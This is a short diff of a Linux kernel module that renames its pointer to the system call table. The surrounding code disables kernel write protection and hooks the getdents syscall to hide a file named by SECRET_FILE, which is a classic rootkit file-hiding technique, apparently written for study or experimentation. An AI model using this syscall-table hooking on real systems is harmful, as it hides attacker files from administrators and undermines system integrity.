@@ -29,7 +29,7 @@ MODULE_LICENSE("GPL");
 # define SECRET_FILE "032416_525.mp4"
 
 
-asmlinkage unsigned long **sys_call_table;
+asmlinkage unsigned long **real_sys_call_table;
 
 asmlinkage long
 (*real_getdents)(unsigned int fd,
@@ -56,7 +56,7 @@ init_module(void)
   pr_alert("%s\n", "Greetings the World!");
 
   /* No consideration on failure. */
-  sys_call_table = get_sys_call_table();
+  real_sys_call_table = get_sys_call_table();
 
   disable_write_protection();
   HOOK_SYS_CALL_TABLE(getdents);
